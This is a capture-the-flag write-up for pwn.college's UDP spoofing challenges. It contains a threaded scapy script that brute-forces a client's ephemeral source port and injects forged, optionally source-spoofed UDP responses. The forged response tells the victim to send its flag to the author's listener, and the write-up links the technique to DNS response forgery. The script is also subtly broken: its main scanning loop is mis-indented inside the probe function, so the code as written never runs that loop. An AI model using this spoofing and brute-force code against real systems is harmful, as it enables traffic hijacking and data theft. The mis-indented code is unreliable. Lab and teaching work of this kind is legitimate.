# Problem Statement
 ## UDP Spoofing 3
Of course, the previous spoofing worked because you know the source port that the client was using, and were thus able to forge the server's response. This was, in fact, at the core of a very famous vulnerability in the Domain Name System that facilitates the translation of host names like https://pwn.college to the appropriate IP addresses. The vulnerability allowed attackers to forge responses from DNS servers and redirect victims to IP addresses of their choice!

The fix for that vulnerability was to randomize the source port that DNS requests go out from. Likewise, this challenge no longer binds the source port to 31338. Can you still force the response?

HINT: The source port is only set once per socket, whether at bind time or at the first sendto. What do you do when there's a fixed number that you don't know?

 ## UDP Spoofing 4
Let's up the game a bit: this challenge checks that the response came from the right server! Luckily, UDP is a lot easier to forge than TCP. In TCP, forging a server response requires you to know sequence numbers and a whole bunch of other inconvenient-to-guess information. Not so with UDP!

Go ahead and craft the server response with scapy, as you've done with TCP, and let's see that flag fly!

## Observations
 - In order to narrow down the bruteforce probe, I looked up conventions for private ports and Linux seems to use (32768-60999). The solution
   adheres to this at least, but I ended up just going for all non-well-known ports (>1024). This is done in batches so that the system isn't overloaded with threads
 - Starting to bruteforce from the end of the list might be more efficient in the above scenario. 60 batches take only a few minutes anyway.
 - It isn't strictly necessary to have a listener running. The program output will tell you which port was discovered (along with a bunch of false positives if you use `sr1` instead of `send`, but the packet summary printed gives you unequivocally the source port).
   - ```
     # Output excerpt. It is port 43454 that we want as it is the source port in the packet summary
     IP / UDP 10.0.0.2:43454 > 10.0.0.1:31337 / Raw
     IP / UDP 10.0.0.2:43454 > 10.0.0.1:31337 / Raw
     IP / UDP 10.0.0.2:43454 > 10.0.0.1:31337 / Raw
     IP / UDP 10.0.0.2:43454 > 10.0.0.1:31337 / Raw
     Port 43539
     Port 43478
     Port 43521
     Port 43527
     Port 43520
     ```
 - If you don't want to have a listener in the background, using scapy to send the flag exfiltration message with the function `sr1` once you figure out the port should return you the flag.
   In that case, remove the scapy import line at the top of the port prober code and you can run the code directly from scapy.

# Solution
## Listener  (not strictly necessary, just makes it easier)
- `python udp_listener.py > udp_listener.log &`
```
from socket import *

s = socket(AF_INET, SOCK_DGRAM)
s.bind(("0.0.0.0", 31337))
print("If you read this, I'm listening...")
msg, addr = s.recvfrom(4096)
print(f"Received from {addr}: {msg.decode()}")

```

## Port prober
- `python udp_prober.py`
- for challenge 4, I didn't like the output with false positives so the `probe_port` code became just the definition of pkt and `send` instead of `sr1`
  - Note: Add appropriate `src` value to the IP layer for challenge 4 to spoof the UDP packet.
```
import threading
from scapy.all import *

# This is just to split the ~60k ports to probe into chunks to limit threads to ~1k at a time.
def split_range(start, end, num_chunks):
    step = (end - start) // num_chunks
    ranges = []

    for i in range(num_chunks):
        chunk_start = start + i * step
        chunk_end = start + (i + 1) * step if i < num_chunks - 1 else end
        ranges.append((chunk_start, chunk_end))

    return ranges


def probe_port(ip, port, results):
    if port == 31337: # not saving much by excluding this one port, but we already know it isn't this one
        results[port] = False
        return

    pkt = IP(dst=ip)/UDP(sport=31337, dport=port)/Raw(load=f"FLAG:10.0.0.1:31337") # any port will do in our payload, just match the listener if any or leave this to use sr1
    reply = sr1(pkt, timeout=1)
    if reply is None:
        results[port] = False
    elif reply.haslayer(ICMP) and reply.getlayer(ICMP).type == 3 and reply.getlayer(ICMP).code == 3:
        results[port] = False
    else:
        print(reply)
        results[port] = True # Note: if running a listener, this will generate a bunch of false positives.

    ip = "10.0.0.2"
    
    start_port = 1024 # could optimize this probably starting  from at least 30000
    end_port = 65536

    for chunk in split_range(start_port, end_port, 60): # whatever chunk size is chosen, try to keep port ranges below 1k
        results = {}
        threads = []
        print(f"Processing: {chunk}")

        for port in range(chunk[0], chunk[1]):
            t = threading.Thread(target=probe_port, args=(ip, port, results))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        for port, isopen in results.items():
            if isopen:
                print(f"Port {port}")
    ```


